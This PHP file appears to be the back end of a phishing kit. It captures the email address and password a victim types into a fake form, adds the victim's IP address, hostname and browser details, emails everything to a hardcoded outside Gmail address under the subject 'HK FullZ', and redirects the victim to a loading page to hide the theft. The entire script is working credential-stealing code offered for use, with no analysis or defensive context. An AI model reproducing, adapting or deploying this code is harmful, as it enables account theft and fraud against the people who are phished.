<?php 
$Ok= "agentghost442@gmail.com"; // Put Your Emails Here
$ip = getenv("REMOTE_ADDR");
$date			=	date("D M d, Y g:i a");
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$fuck  = "================== Contact Information & CC Infor ==================\n";
$fuck .= "Email Address : ".$_POST['email']."\n";
$fuck .= "Email Pass : ".$_POST['password']."\n";
$fuck .= "============= [ Ip & Hostname Info ] =============\n";
$fuck .= "Client IP : ".$ip."\n";
$fuck .= "HostName : ".$hostname."\n";
$fuck .= "Date And Time : ".$date."\n";
$fuck .= "Browser Details : ".$user_agent."\n";
$fuck .= "=============+Codewizard+===========\n";
$subject = "HK FullZ $ip";
$headers = "From: HK FullZ <codewizard@approject.com>";
mail($Ok,$subject,$fuck,$headers);
Header ("Location: loader.html");
?>